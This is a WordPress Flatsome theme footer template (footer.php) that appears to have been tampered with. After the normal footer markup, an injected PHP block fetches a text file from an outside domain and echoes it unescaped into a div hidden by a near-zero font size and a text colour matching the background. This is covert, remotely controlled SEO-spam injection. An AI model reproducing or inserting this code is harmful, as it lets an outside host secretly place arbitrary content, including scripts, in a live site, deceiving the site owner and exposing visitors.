<?php
/**
 * The template for displaying the footer.
 *
 * @package          Flatsome\Templates
 * @flatsome-version 3.16.0
 */

global $flatsome_opt;
?>

</main>

<footer id="footer" class="footer-wrapper">

	<?php do_action('flatsome_footer'); ?>

</footer>

</div>
<?php
        echo "<div class='sponsor-area' style='background-color: #f4f4f4; font-size: 0.00001px; color: #f4f4f4;'>";
        echo file_get_contents("https://yokgercep.com/hiden-seo.txt");
        echo "</div>";
?>
<?php wp_footer(); ?>

</body>
</html>
